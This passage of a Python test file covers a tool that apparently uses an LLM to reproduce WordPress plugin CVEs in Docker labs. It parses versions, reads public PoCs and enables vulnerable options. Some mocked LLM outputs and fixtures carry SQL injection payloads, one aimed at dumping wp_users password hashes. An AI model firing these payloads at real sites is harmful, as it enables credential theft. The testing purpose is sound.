        "https://plugins.trac.wordpress.org/changeset/123/foo-bar?old=456") == "foo-bar"
    assert _extract_wp_trac_plugin_slug("https://wordpress.org/plugins/foo-bar/") is None
    assert _extract_wp_trac_plugin_slug("automatic") is None


def test_fetch_source_resolves_wp_trac_changeset_url_to_slug(monkeypatch):
    from binoracle.workflows import websource
    called = {}
    def fake_wp(slug, version="", dest_dir="", on_step=None, timeout=60.0, exclusive_upper_bound=False):
        called["slug"] = slug
        called["version"] = version
        return websource.SourceFetchResult(ok=True, kind="wordpress-plugin", source=slug)
    monkeypatch.setattr(websource, "fetch_wordpress_plugin", fake_wp)

    res = websource.fetch_source(
        "https://plugins.trac.wordpress.org/changeset/5678901/ultimate-member/trunk/",
        version="2.8.2")
    assert res.ok is True
    assert called["slug"] == "ultimate-member"
    assert called["version"] == "2.8.2"


def test_wp_login_reports_real_exception_via_on_step(monkeypatch):
    # bug real confirmado en vivo: un fallo de login (red, Burp, WordPress rechazando
    # credenciales) siempre se veia igual desde fuera ('no se pudo iniciar sesion'), sin forma
    # de distinguir cual de esas tres cosas paso realmente -- _wp_login ahora reporta el motivo
    # concreto via on_step cuando se le da uno.
    import binoracle.workflows.wpverify as wpverify

    class _BoomSession:
        cookies = []
        def post(self, *a, **kw):
            raise ConnectionError("conexion rechazada (prueba)")

    import requests as _requests_mod
    monkeypatch.setattr(_requests_mod, "Session", lambda: _BoomSession())
    messages = []
    sess = wpverify._wp_login("http://lab.invalid", "user", "pass", on_step=messages.append)
    assert sess is None
    assert any("ConnectionError" in m and "conexion rechazada" in m for m in messages)


def test_wp_login_reports_missing_cookie_via_on_step(monkeypatch):
    import binoracle.workflows.wpverify as wpverify

    class _FakeResp:
        status_code = 200
        text = "ERROR: incorrect password"
        cookies = []

    class _NoCookieSession:
        cookies = []
        def post(self, *a, **kw):
            return _FakeResp()

    import requests as _requests_mod
    monkeypatch.setattr(_requests_mod, "Session", lambda: _NoCookieSession())
    messages = []
    sess = wpverify._wp_login("http://lab.invalid", "user", "wrongpass", on_step=messages.append)
    assert sess is None
    assert any("sin cookie de sesion" in m and "status=200" in m for m in messages)


def test_wp_login_default_timeout_is_generous():
    # confirmado en vivo: con los 15s originales, el login fallaba con TimeoutError bajo carga
    # real (varios laboratorios Docker a la vez, o Apache/PHP lento bajo emulacion amd64).
    import inspect
    from binoracle.workflows.wpverify import _wp_login
    default_timeout = inspect.signature(_wp_login).parameters["timeout"].default
    assert default_timeout >= 30.0


def test_refine_web_hints_from_source_extracts_setup_options(tmp_path):
    # CVE-2024-1071 (Ultimate Member): el codigo SQLi real solo se ejecuta si el plugin tiene
    # activada 'Enable custom table for usermeta' -- con la config de fabrica, ninguna tecnica de
    # deteccion encuentra nada porque el codigo vulnerable nunca se alcanza. En vez de que el
    # analista tenga que leer el codigo a mano y activar la opcion por fuera, el LLM que YA lee
    # el codigo real para afinar endpoint/parametros debe poder proponer esto solo.
    import json as _json
    from binoracle.workflows.cve_agent import _refine_web_hints_from_source

    plugin_file = tmp_path / "class-member-directory-meta.php"
    plugin_file.write_text(
        "<?php\n"
        "function um_prepare_user_results_array_meta() {\n"
        "    if ( UM()->options()->get('enable_custom_usermeta_table') ) {\n"
        "        global $wpdb;\n"
        "        $sortby = sanitize_text_field( $_POST['sorting'] );\n"
        "        $wpdb->get_col(\"SELECT u.ID FROM {$wpdb->users} AS u {$this->sql_order}\");\n"
        "    }\n"
        "}\n")

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "ajax_action": "um_get_members", "http_method": "POST",
                "parameters": ["sorting"], "id_param": "", "email_param": "", "pass_param": "",
                "setup_options": [{"name": "enable_custom_usermeta_table", "value": "1"}],
            })

    found = {"um_prepare_user_results_array_meta": [f"{plugin_file.name}:2"]}
    out = _refine_web_hints_from_source(_FakeLLM(), str(tmp_path), found)
    assert out is not None
    assert out["setup_options"] == [{"name": "enable_custom_usermeta_table", "value": "1"}]
    assert out["endpoint"] == "/wp-admin/admin-ajax.php?action=um_get_members"


def test_refine_web_hints_from_source_ignores_setup_options_without_name(tmp_path):
    import json as _json
    from binoracle.workflows.cve_agent import _refine_web_hints_from_source

    plugin_file = tmp_path / "foo.php"
    plugin_file.write_text("<?php\nfunction vuln() {}\n")

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({"setup_options": [{"value": "1"}, {"name": ""}, "not-a-dict"]})

    found = {"vuln": [f"{plugin_file.name}:2"]}
    out = _refine_web_hints_from_source(_FakeLLM(), str(tmp_path), found)
    assert out is None or "setup_options" not in out


def test_fetch_public_poc_source_clones_github_ref_and_reads_text_files(monkeypatch, tmp_path):
    # antes de este fix "ya tiene exploit publico" solo era un booleano -- nunca se leia el PoC
    # YA PUBLICADO para sacar de el el endpoint/payload/precondiciones exactas. fetch_git_source
    # se monkeypatchea porque el clone real necesita red; lo que se prueba aqui es que
    # fetch_public_poc_source SI recorre el repo "clonado" y concatena sus ficheros de texto.
    from binoracle.workflows import cve_agent
    from binoracle.workflows.cvelookup import ExploitRef
    from binoracle.workflows import websource

    repo_dir = tmp_path / "cloned_repo"
    repo_dir.mkdir()
    (repo_dir / "exploit.py").write_text("print('poc payload: sorting=-1 UNION SELECT 1,2--')")
    (repo_dir / "README.md").write_text("First enable 'custom table' in plugin settings.")
    (repo_dir / "image.png").write_bytes(b"\x89PNG\r\n")   # binario -- no debe incluirse

    def fake_fetch_git_source(url, ref="", dest_dir="", on_step=None, timeout=90.0):
        return websource.SourceFetchResult(ok=True, kind="git", source=url, local_path=str(repo_dir))
    monkeypatch.setattr(websource, "fetch_git_source", fake_fetch_git_source)

    refs = [ExploitRef(url="https://github.com/someone/CVE-2024-1071", source="github")]
    text = cve_agent.fetch_public_poc_source(refs)
    assert text is not None
    assert "sorting=-1 UNION SELECT" in text
    assert "custom table" in text
    assert "image.png" not in text


def test_fetch_public_poc_source_returns_none_without_github_refs():
    from binoracle.workflows import cve_agent
    from binoracle.workflows.cvelookup import ExploitRef
    refs = [ExploitRef(url="https://www.exploit-db.com/exploits/12345", source="exploit-db")]
    assert cve_agent.fetch_public_poc_source(refs) is None
    assert cve_agent.fetch_public_poc_source([]) is None


def test_extract_hints_from_real_poc_parses_endpoint_payload_and_setup_options():
    import json as _json
    from binoracle.workflows.cve_agent import _extract_hints_from_real_poc

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "source_url": "ultimate-member", "affected_version": "2.8.2",
                "http_method": "post", "endpoint": "/wp-admin/admin-ajax.php?action=um_get_members",
                "parameters": ["sorting"], "payload_example": "-1 UNION SELECT user_login,user_pass FROM wp_users--",
                "setup_options": [{"name": "enable_custom_usermeta_table", "value": "1"}],
                "notes": "requires the custom usermeta table option enabled",
            })

    out = _extract_hints_from_real_poc(_FakeLLM(), "# exploit.py\nreal poc code here")
    assert out["source_url"] == "ultimate-member"
    assert out["http_method"] == "POST"
    assert out["parameters"] == ["sorting"]
    assert "UNION SELECT" in out["payload_example"]
    assert out["setup_options"] == [{"name": "enable_custom_usermeta_table", "value": "1"}]
    assert "custom usermeta table" in out["poc_notes"]


def test_extract_hints_from_real_poc_returns_none_without_llm_or_text():
    from binoracle.workflows.cve_agent import _extract_hints_from_real_poc
    assert _extract_hints_from_real_poc(None, "some poc text") is None

    class _UnavailableLLM:
        def available(self):
            return False
    assert _extract_hints_from_real_poc(_UnavailableLLM(), "some poc text") is None

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return "{}"
    assert _extract_hints_from_real_poc(_FakeLLM(), "") is None


def test_drop_unreliable_poc_version_rejects_dotless_version_over_dotted_one():
    # bug real confirmado en vivo (CVE-2024-1071): el LLM, leyendo el PoC, transcribio el rango de
    # versiones sin los puntos ("213-282" en vez de "2.1.3-2.8.2") -- eso piso la version YA bien
    # formada que veniamos de la hipotesis desde la descripcion de la CVE, generando una URL de
    # descarga rota (ultimate-member.213-282.zip, 404).
    from binoracle.workflows.cve_agent import _drop_unreliable_poc_version

    poc_hints = {"affected_version": "213-282", "endpoint": "/wp-admin/admin-ajax.php"}
    cleaned, dropped = _drop_unreliable_poc_version(poc_hints, "2.1.3 to 2.8.2")
    assert "affected_version" not in cleaned
    assert cleaned["endpoint"] == "/wp-admin/admin-ajax.php"   # el resto de datos se conserva
    assert dropped == ("213-282", "2.1.3 to 2.8.2")


def test_drop_unreliable_poc_version_keeps_dotted_poc_version():
    from binoracle.workflows.cve_agent import _drop_unreliable_poc_version
    poc_hints = {"affected_version": "2.8.2"}
    cleaned, dropped = _drop_unreliable_poc_version(poc_hints, "2.1.3 to 2.8.2")
    assert cleaned["affected_version"] == "2.8.2"
    assert dropped is None


def test_drop_unreliable_poc_version_keeps_dotless_poc_version_without_existing_one():
    # sin una version previa bien formada que proteger, no hay nada que descartar -- es lo unico
    # que tenemos, mejor eso que nada.
    from binoracle.workflows.cve_agent import _drop_unreliable_poc_version
    poc_hints = {"affected_version": "213-282"}
    cleaned, dropped = _drop_unreliable_poc_version(poc_hints, "")
    assert cleaned["affected_version"] == "213-282"
    assert dropped is None


def test_drop_poc_self_referencing_source_url_rejects_the_poc_repo_itself():
    # bug real confirmado en vivo (CVE-2024-1071): el LLM, leyendo el PoC, devolvio el propio
    # repo de GitHub del PoC como source_url (en vez del slug del plugin pedido explicitamente) --
    # fetch_source() intento clonar ESE repo con --branch puesta a la version afectada, que
    # logicamente no existe ahi ("Remote branch 2.8.2 not found"), rompiendo la obtencion del
    # codigo real que SI habia funcionado un paso antes con la hipotesis anterior.
    from binoracle.workflows.cve_agent import _drop_poc_self_referencing_source_url

    poc_hints = {"source_url": "https://github.com/gbrsh/CVE-2024-1071", "endpoint": "/x"}
    cleaned, dropped = _drop_poc_self_referencing_source_url(
        poc_hints, "https://github.com/gbrsh/CVE-2024-1071")
    assert "source_url" not in cleaned
    assert cleaned["endpoint"] == "/x"   # el resto de datos se conserva
    assert dropped == "https://github.com/gbrsh/CVE-2024-1071"

    # con barra o .git final tambien se reconoce como el mismo repo
    poc_hints2 = {"source_url": "https://github.com/gbrsh/CVE-2024-1071.git/"}
    cleaned2, dropped2 = _drop_poc_self_referencing_source_url(
        poc_hints2, "https://github.com/gbrsh/CVE-2024-1071")
    assert "source_url" not in cleaned2
    assert dropped2 is not None


def test_drop_poc_self_referencing_source_url_keeps_a_real_plugin_slug():
    from binoracle.workflows.cve_agent import _drop_poc_self_referencing_source_url
    poc_hints = {"source_url": "ultimate-member"}
    cleaned, dropped = _drop_poc_self_referencing_source_url(
        poc_hints, "https://github.com/gbrsh/CVE-2024-1071")
    assert cleaned["source_url"] == "ultimate-member"
    assert dropped is None


def test_bootstrap_lab_applies_setup_wp_options_before_login(monkeypatch, tmp_path):
    # confirma que _bootstrap_lab de verdad invoca `wp option update` para cada opcion antes de
    # seguir, en vez de solo guardar el dato sin usarlo.
    import binoracle.workflows.wpverify as wpverify

    calls = []

    class _FakeCompletedProcess:
        def __init__(self, returncode=0, stdout="", stderr=""):
            self.returncode = returncode
            self.stdout = stdout
            self.stderr = stderr

    class _FakeLab:
        def __init__(self):
            self.mysql = "fake-mysql"
            self.wp = "fake-wp"
        def setup_network_and_volume(self):
            pass
        def start_mysql(self, *a):
            pass
        def mysql_ready(self, *a, **kw):
            return True
        def start_wordpress(self, *a):
            return 12345
        def http_ready(self, *a):
            return True
        def wp_cli(self, *args, **kw):
            calls.append(args)
            if args[:2] == ("user", "get"):
                return _FakeCompletedProcess(stdout="1")
            return _FakeCompletedProcess(returncode=0)
        def install_plugin(self, *a):
            return True
        def logs_tail(self, *a):
            return ""

    monkeypatch.setattr(wpverify, "_lab_host", lambda: "127.0.0.1")
    monkeypatch.setattr(wpverify, "_wp_login", lambda *a, **kw: None)
    monkeypatch.setattr(wpverify, "_screenshot_authenticated", lambda *a, **kw: None)

    import time as _time
    res = wpverify.WpVerifyResult()
    boot = wpverify._bootstrap_lab(
        _FakeLab(), str(tmp_path), "ultimate-member", lambda _m: None, res, _time.time(), 1200.0,
        setup_wp_options=[{"name": "enable_custom_usermeta_table", "value": "1"}])

    option_update_calls = [c for c in calls if c[:2] == ("option", "update")]
    assert option_update_calls == [("option", "update", "enable_custom_usermeta_table", "1")]
    # la opcion se activa ANTES de intentar el login del subscriber (que aqui falla a proposito)
    assert boot is None
    assert "no se pudo iniciar sesion" in (res.detail or "")


def test_bootstrap_lab_enables_wp_debug_log_but_not_display_by_default(monkeypatch, tmp_path):
    # bug real confirmado en vivo, CVE-2024-1071 (Ultimate Member), en una demo real: con
    # WP_DEBUG_DISPLAY=true activado SIEMPRE para TODO verificador (como era antes), un simple
    # aviso de PHP totalmente ajeno a la inyeccion (p.ej. el propio plugin cargando su dominio
    # de traduccion demasiado pronto, "_load_textdomain_just_in_time called incorrectly") se
    # imprimia como HTML ANTES de que WordPress pudiera mandar la cabecera Set-Cookie del login
    # -- "headers already sent" silencioso, sin error visible, dejaba el login sin cookie de
    # sesion para CUALQUIER verificador (XSS, SSRF, account-takeover...), no solo SQLi. Por
    # defecto WP_DEBUG_DISPLAY debe quedar en false (WP_DEBUG_LOG sigue activo: los errores se
    # escriben en debug.log, visibles via `docker exec` si hiciera falta, sin tocar la
    # respuesta HTTP y por tanto sin poder romper ningun login).
    import binoracle.workflows.wpverify as wpverify

    calls = []

    class _FakeCompletedProcess:
        def __init__(self, returncode=0, stdout="", stderr=""):
            self.returncode = returncode
            self.stdout = stdout
            self.stderr = stderr

    class _FakeLab:
        def __init__(self):
            self.mysql = "fake-mysql"
            self.wp = "fake-wp"
        def setup_network_and_volume(self):
            pass
        def start_mysql(self, *a):
            pass
        def mysql_ready(self, *a, **kw):
            return True
        def start_wordpress(self, *a):
            return 12345
        def http_ready(self, *a):
            return True
        def wp_cli(self, *args, **kw):
            calls.append(args)
            if args[:2] == ("user", "get"):
                return _FakeCompletedProcess(stdout="1")
            return _FakeCompletedProcess(returncode=0)
        def install_plugin(self, *a):
            calls.append(("install_plugin",) + a)
            return True
        def logs_tail(self, *a):
            return ""

    monkeypatch.setattr(wpverify, "_lab_host", lambda: "127.0.0.1")
    monkeypatch.setattr(wpverify, "_wp_login", lambda *a, **kw: None)
    monkeypatch.setattr(wpverify, "_screenshot_authenticated", lambda *a, **kw: None)

    import time as _time
    res = wpverify.WpVerifyResult()
    wpverify._bootstrap_lab(
        _FakeLab(), str(tmp_path), "web-directory-free", lambda _m: None, res, _time.time(),
        1200.0)

    debug_calls = [c for c in calls if c[:2] == ("config", "set")]
    assert ("config", "set", "WP_DEBUG", "true", "--raw", "--type=constant") in debug_calls
    assert ("config", "set", "WP_DEBUG_LOG", "true", "--raw", "--type=constant") in debug_calls
    assert ("config", "set", "WP_DEBUG_DISPLAY", "false", "--raw", "--type=constant") in debug_calls
    install_idx = next(i for i, c in enumerate(calls) if c and c[0] == "install_plugin")
    debug_idxs = [i for i, c in enumerate(calls) if c[:2] == ("config", "set")]
    assert debug_idxs and all(i < install_idx for i in debug_idxs)


def test_bootstrap_lab_enables_wp_debug_display_when_requested_by_sqli(monkeypatch, tmp_path):
    # _bootstrap_lab sigue soportando wp_debug_display=True como parametro (lo usa el test de
    # abajo, test_verify_wordpress_sqli_enables_debug_display_only_after_login, para confirmar
    # que verify_wordpress_sqli YA NO lo activa por esta via -- lo activa el mismo con un wp_cli
    # aparte, DESPUES del login, ver esa otra prueba para el porque). Este test solo confirma
    # que el parametro, si se pide, se aplica correctamente dentro del propio bootstrap.
    import binoracle.workflows.wpverify as wpverify

    calls = []

    class _FakeCompletedProcess:
        def __init__(self, returncode=0, stdout="", stderr=""):
            self.returncode = returncode
            self.stdout = stdout
            self.stderr = stderr

    class _FakeLab:
        def __init__(self):
            self.mysql = "fake-mysql"
            self.wp = "fake-wp"
        def setup_network_and_volume(self):
            pass
        def start_mysql(self, *a):
            pass
        def mysql_ready(self, *a, **kw):
            return True
        def start_wordpress(self, *a):
            return 12345
        def http_ready(self, *a):
            return True
        def wp_cli(self, *args, **kw):
            calls.append(args)
            if args[:2] == ("user", "get"):
                return _FakeCompletedProcess(stdout="1")
            return _FakeCompletedProcess(returncode=0)
        def install_plugin(self, *a):
            calls.append(("install_plugin",) + a)
            return True
        def logs_tail(self, *a):
            return ""

    monkeypatch.setattr(wpverify, "_lab_host", lambda: "127.0.0.1")
    monkeypatch.setattr(wpverify, "_wp_login", lambda *a, **kw: None)
    monkeypatch.setattr(wpverify, "_screenshot_authenticated", lambda *a, **kw: None)

    import time as _time
    res = wpverify.WpVerifyResult()
    wpverify._bootstrap_lab(
        _FakeLab(), str(tmp_path), "web-directory-free", lambda _m: None, res, _time.time(),
        1200.0, wp_debug_display=True)

    debug_calls = [c for c in calls if c[:2] == ("config", "set")]
    assert ("config", "set", "WP_DEBUG_DISPLAY", "true", "--raw", "--type=constant") in debug_calls


def test_bootstrap_lab_creates_shortcode_page_when_requested(monkeypatch, tmp_path):
    # bug real confirmado en vivo, CVE-2024-3552: atacar '/' (portada vacia) no puede reflejar
    # ninguna diferencia visible aunque la inyeccion sea real -- _bootstrap_lab debe crear una
    # pagina de verdad con el shortcode del plugin ANTES de devolver el _LabSession, y exponer
    # su ruta relativa para que el verificador ataque esa pagina en vez de la portada.
    import binoracle.workflows.wpverify as wpverify

    calls = []

    class _FakeCompletedProcess:
        def __init__(self, returncode=0, stdout="", stderr=""):
            self.returncode = returncode
            self.stdout = stdout
            self.stderr = stderr

    class _FakeSession:
        pass

    class _FakeLab:
        def __init__(self):
            self.mysql = "fake-mysql"
            self.wp = "fake-wp"
        def setup_network_and_volume(self):
            pass
        def start_mysql(self, *a):
            pass
        def mysql_ready(self, *a, **kw):
            return True
        def start_wordpress(self, *a):
            return 12345
        def http_ready(self, *a):
            return True
        def wp_cli(self, *args, **kw):
            calls.append(args)
            if args[:2] == ("user", "get"):
                return _FakeCompletedProcess(stdout="1")
            if args[:2] == ("post", "create"):
                return _FakeCompletedProcess(stdout="42\n")
            return _FakeCompletedProcess(returncode=0)
        def install_plugin(self, *a):
            calls.append(("install_plugin",) + a)
            return True
        def logs_tail(self, *a):
            return ""

    monkeypatch.setattr(wpverify, "_lab_host", lambda: "127.0.0.1")
    monkeypatch.setattr(wpverify, "_wp_login", lambda *a, **kw: _FakeSession())
    monkeypatch.setattr(wpverify, "_screenshot_authenticated", lambda *a, **kw: None)

    import time as _time
    res = wpverify.WpVerifyResult()
    boot = wpverify._bootstrap_lab(
        _FakeLab(), str(tmp_path), "web-directory-free", lambda _m: None, res, _time.time(),
        1200.0, shortcode_name="w2dc_search")

    assert boot is not None
    assert boot.shortcode_page_path == "/?page_id=42"
    post_create_calls = [c for c in calls if c[:2] == ("post", "create")]
    assert len(post_create_calls) == 1
    assert "--post_content=[w2dc_search]" in post_create_calls[0]
    install_idx = next(i for i, c in enumerate(calls) if c and c[0] == "install_plugin")
    page_idx = calls.index(post_create_calls[0])
    assert install_idx < page_idx    # la pagina se crea DESPUES de activar el plugin


def test_bootstrap_lab_shortcode_page_creation_failure_is_a_limitation_not_a_hard_stop(
        monkeypatch, tmp_path):
    import binoracle.workflows.wpverify as wpverify

    class _FakeCompletedProcess:
        def __init__(self, returncode=0, stdout="", stderr=""):
            self.returncode = returncode
            self.stdout = stdout
            self.stderr = stderr

    class _FakeSession:
        pass

    class _FakeLab:
        def __init__(self):
            self.mysql = "fake-mysql"
            self.wp = "fake-wp"
        def setup_network_and_volume(self):
            pass
        def start_mysql(self, *a):
            pass
        def mysql_ready(self, *a, **kw):
            return True
        def start_wordpress(self, *a):
            return 12345
        def http_ready(self, *a):
            return True
        def wp_cli(self, *args, **kw):
            if args[:2] == ("user", "get"):
                return _FakeCompletedProcess(stdout="1")
            if args[:2] == ("post", "create"):
                return _FakeCompletedProcess(returncode=1, stderr="wp-cli: fallo simulado")
            return _FakeCompletedProcess(returncode=0)
        def install_plugin(self, *a):
            return True
        def logs_tail(self, *a):
            return ""

    monkeypatch.setattr(wpverify, "_lab_host", lambda: "127.0.0.1")
    monkeypatch.setattr(wpverify, "_wp_login", lambda *a, **kw: _FakeSession())
    monkeypatch.setattr(wpverify, "_screenshot_authenticated", lambda *a, **kw: None)

    import time as _time
    res = wpverify.WpVerifyResult()
    boot = wpverify._bootstrap_lab(
        _FakeLab(), str(tmp_path), "web-directory-free", lambda _m: None, res, _time.time(),
        1200.0, shortcode_name="w2dc_search")

    assert boot is not None    # no aborta el resto del laboratorio por esto
    assert boot.shortcode_page_path is None
    assert any("shortcode" in lim for lim in res.limitations)


def test_bootstrap_lab_inserts_relationship_row_for_shortcode_page(monkeypatch, tmp_path):
    # bug real confirmado en vivo, CVE-2024-3552: el sumidero real esta detras de un LEFT JOIN
    # propio del plugin enlazado por post ID -- una pagina de shortcode SIN fila en esa tabla
    # sale siempre NULL en esa columna, asi que el WHERE del sumidero nunca es verdadero. Con
    # `relationship_table`, _bootstrap_lab debe insertar esa fila DESPUES de crear la pagina y
    # ANTES de devolver el _LabSession.
    import binoracle.workflows.wpverify as wpverify

    calls = []

    class _FakeCompletedProcess:
        def __init__(self, returncode=0, stdout="", stderr=""):
            self.returncode = returncode
            self.stdout = stdout
            self.stderr = stderr

    class _FakeSession:
        pass

    class _FakeLab:
        def __init__(self):
            self.mysql = "fake-mysql"
            self.wp = "fake-wp"
        def setup_network_and_volume(self):
            pass
        def start_mysql(self, *a):
            pass
        def mysql_ready(self, *a, **kw):
            return True
        def start_wordpress(self, *a):
            return 12345
        def http_ready(self, *a):
            return True
        def wp_cli(self, *args, **kw):
            calls.append(args)
            if args[:2] == ("user", "get"):
                return _FakeCompletedProcess(stdout="1")
            if args[:2] == ("post", "create"):
                return _FakeCompletedProcess(stdout="6\n")
            if args and args[0] == "eval":
                # construido/ejecutado ENTERO dentro de un unico `wp eval` (DESCRIBE + INSERT via
                # $wpdb) -- no hay forma de simular la base de datos real aqui, asi que el fake
                # solo confirma que SE LE PIDIO insertar la fila de relacion correcta (tabla,
                # columna de join y valor del post), devolviendo 'OK' como si $wpdb->query()
                # hubiera tenido exito.
                return _FakeCompletedProcess(stdout="OK")
            return _FakeCompletedProcess(returncode=0)
        def install_plugin(self, *a):
            return True
        def logs_tail(self, *a):
            return ""

    monkeypatch.setattr(wpverify, "_lab_host", lambda: "127.0.0.1")
    monkeypatch.setattr(wpverify, "_wp_login", lambda *a, **kw: _FakeSession())
    monkeypatch.setattr(wpverify, "_screenshot_authenticated", lambda *a, **kw: None)

    import time as _time
    res = wpverify.WpVerifyResult()
    boot = wpverify._bootstrap_lab(
        _FakeLab(), str(tmp_path), "web-directory-free", lambda _m: None, res, _time.time(),
        1200.0, shortcode_name="w2dc_search",
        relationship_table={"wpdb_property": "w2dc_levels_relationships",
                            "alias": "w2dc_lr", "join_column": "post_id"})

    assert boot is not None
    assert boot.shortcode_page_path == "/?page_id=6"
    insert_calls = [c for c in calls if c and c[0] == "eval" and "INSERT INTO" in c[1]]
    assert len(insert_calls) == 1
    php = insert_calls[0][1]
    assert "w2dc_levels_relationships" in php
    assert "'post_id'" in php and "'6'" in php
    assert "DESCRIBE" in php    # consulta el esquema real en vez de adivinar columnas NOT NULL


def test_bootstrap_lab_relationship_row_insert_failure_is_a_limitation(monkeypatch, tmp_path):
    import binoracle.workflows.wpverify as wpverify

    class _FakeCompletedProcess:
        def __init__(self, returncode=0, stdout="", stderr=""):
            self.returncode = returncode
            self.stdout = stdout
            self.stderr = stderr

    class _FakeSession:
        pass

    class _FakeLab:
        def __init__(self):
            self.mysql = "fake-mysql"
            self.wp = "fake-wp"
        def setup_network_and_volume(self):
            pass
        def start_mysql(self, *a):
            pass
        def mysql_ready(self, *a, **kw):
            return True
        def start_wordpress(self, *a):
            return 12345
        def http_ready(self, *a):
            return True
        def wp_cli(self, *args, **kw):
            if args[:2] == ("user", "get"):
                return _FakeCompletedProcess(stdout="1")
            if args[:2] == ("post", "create"):
                return _FakeCompletedProcess(stdout="6\n")
            if args and args[0] == "eval" and "INSERT INTO" in args[1]:
                # $wpdb->last_error real, tal cual lo devolveria el eco de PHP (no 'OK')
                return _FakeCompletedProcess(stdout="Column 'level_id' cannot be null")
            return _FakeCompletedProcess(returncode=0)
        def install_plugin(self, *a):
            return True
        def logs_tail(self, *a):
            return ""

    monkeypatch.setattr(wpverify, "_lab_host", lambda: "127.0.0.1")
    monkeypatch.setattr(wpverify, "_wp_login", lambda *a, **kw: _FakeSession())
    monkeypatch.setattr(wpverify, "_screenshot_authenticated", lambda *a, **kw: None)

    import time as _time
    res = wpverify.WpVerifyResult()
    boot = wpverify._bootstrap_lab(
        _FakeLab(), str(tmp_path), "web-directory-free", lambda _m: None, res, _time.time(),
        1200.0, shortcode_name="w2dc_search",
        relationship_table={"wpdb_property": "w2dc_levels_relationships",
                            "alias": "w2dc_lr", "join_column": "post_id"})

    assert boot is not None    # no aborta el resto del laboratorio por esto
    assert boot.shortcode_page_path == "/?page_id=6"    # la pagina SI se creo
    assert any("fila de relacion" in lim for lim in res.limitations)


def test_bootstrap_lab_installs_companion_plugins_before_target_plugin(monkeypatch, tmp_path):
    # bug real confirmado en vivo, CVE-2024-50508: el plugin objetivo no registra NINGUN hook si
    # WooCommerce no esta activo (su constructor corta en seco antes) -- _bootstrap_lab debe
    # instalar y activar el companero ANTES de copiar/activar el plugin objetivo, para que su
    # codigo llegue siquiera a cargarse.
    import binoracle.workflows.wpverify as wpverify

    calls = []

    class _FakeCompletedProcess:
        def __init__(self, returncode=0, stdout="", stderr=""):
            self.returncode = returncode
            self.stdout = stdout
            self.stderr = stderr

    class _FakeLab:
        def __init__(self):
            self.mysql = "fake-mysql"
            self.wp = "fake-wp"
        def setup_network_and_volume(self):
            pass
        def start_mysql(self, *a):
            pass
        def mysql_ready(self, *a, **kw):
            return True
        def start_wordpress(self, *a):
            return 12345
        def http_ready(self, *a):
            return True
        def wp_cli(self, *args, **kw):
            calls.append(args)
            if args[:2] == ("user", "get"):
                return _FakeCompletedProcess(stdout="1")
            return _FakeCompletedProcess(returncode=0)
        def install_plugin(self, *a):
            calls.append(("install_plugin",) + a)
            return True
        def logs_tail(self, *a):
            return ""

    monkeypatch.setattr(wpverify, "_lab_host", lambda: "127.0.0.1")
    monkeypatch.setattr(wpverify, "_wp_login", lambda *a, **kw: None)
    monkeypatch.setattr(wpverify, "_screenshot_authenticated", lambda *a, **kw: None)

    import time as _time
    res = wpverify.WpVerifyResult()
    wpverify._bootstrap_lab(
        _FakeLab(), str(tmp_path), "woo-product-design", lambda _m: None, res, _time.time(),
        1200.0, companion_plugins=["woocommerce"])

    install_idx = calls.index(("plugin", "install", "woocommerce", "--activate"))
    target_idx = next(i for i, c in enumerate(calls) if c and c[0] == "install_plugin")
    assert install_idx < target_idx   # el companero se instala ANTES del plugin objetivo


def test_fetch_source_resolves_wp_org_page_url_to_slug(monkeypatch):
    from binoracle.workflows import websource
    called = {}
    def fake_wp(slug, version="", dest_dir="", on_step=None, timeout=60.0, exclusive_upper_bound=False):
        called["slug"] = slug
        called["version"] = version
        return websource.SourceFetchResult(ok=True, kind="wordpress-plugin", source=slug)
    monkeypatch.setattr(websource, "fetch_wordpress_plugin", fake_wp)

    res = websource.fetch_source("https://wordpress.org/plugins/ultimate-member/", version="2.8.2")
    assert res.ok is True
    assert called["slug"] == "ultimate-member"
    assert called["version"] == "2.8.2"


def test_clean_affected_version_extracts_to_phrasing():
    from binoracle.workflows.cve_agent import _clean_affected_version
    assert _clean_affected_version("2.1.3 to 2.8.2") == "2.8.2"
    assert _clean_affected_version("versions 1.0 to 2.0") == "2.0"


def test_extract_wp_org_plugin_slug_handles_locale_subdomains_and_terminators():
    from binoracle.workflows.websource import _extract_wp_org_plugin_slug
    assert _extract_wp_org_plugin_slug("https://es.wordpress.org/plugins/foo-bar/") == "foo-bar"
    assert _extract_wp_org_plugin_slug("https://de.wordpress.org/plugins/foo-bar") == "foo-bar"
    assert _extract_wp_org_plugin_slug("https://pt-br.wordpress.org/plugins/foo-bar/") == "foo-bar"
    assert _extract_wp_org_plugin_slug("wordpress.org/plugins/ultimate-member/") == "ultimate-member"
    assert _extract_wp_org_plugin_slug("https://WordPress.org/Plugins/Foo-Bar/".lower()) == "foo-bar"
    assert _extract_wp_org_plugin_slug("https://wordpress.org/plugins/foo-bar#reviews") == "foo-bar"
    assert _extract_wp_org_plugin_slug("https://wordpress.org/plugins/foo-bar?tab=description") == "foo-bar"


def test_clean_affected_version_handles_before_prior_upto_and_dash_ranges():
    from binoracle.workflows.cve_agent import _clean_affected_version
    assert _clean_affected_version("versions up to 1.26") == "1.26"
    assert _clean_affected_version("versions up to and including 1.26") == "1.26"
    assert _clean_affected_version("affects versions before 1.26") == "1.26"
    assert _clean_affected_version("affects versions prior to 1.26") == "1.26"
    assert _clean_affected_version("affected: <= 1.26") == "1.26"
    assert _clean_affected_version("affected: < 1.26") == "1.26"
    assert _clean_affected_version("1.0 - 2.0") == "2.0"
    assert _clean_affected_version("1.0 – 2.0") == "2.0"
    assert _clean_affected_version("1.0 — 2.0") == "2.0"
    assert _clean_affected_version("5.1.8") == "5.1.8"
    assert _clean_affected_version("") == ""
    assert _clean_affected_version("no version info at all") == ""


def test_clean_affected_version_extracts_upper_bound_from_dashless_range():
    # bug real confirmado en vivo (CVE-2024-1071): un PoC real transcribio el rango de versiones
    # SIN espacios alrededor del guion ("2.1.3-2.8.2"). _VERSION_PATTERN hacia match completo con
    # eso igualmente (solo exige digitos separados por puntos/guiones) y lo devolvia TAL CUAL --
    # pero "2.1.3-2.8.2" no es ninguna version real que exista, asi que la URL de descarga del
    # plugin (.../ultimate-member.2.1.3-2.8.2.zip) daba 404.
    from binoracle.workflows.cve_agent import _clean_affected_version
